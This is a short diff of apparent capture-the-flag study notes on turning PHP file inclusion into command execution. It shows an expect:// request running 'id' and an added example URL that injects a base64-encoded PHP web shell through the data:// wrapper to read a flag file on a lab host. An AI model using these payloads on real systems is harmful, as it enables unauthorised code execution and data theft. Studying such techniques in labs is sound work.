@@ -202,6 +202,10 @@ extension=expect
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
+# Exemplo
+
+http://94.237.62.195:36489/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
+
 
 
 
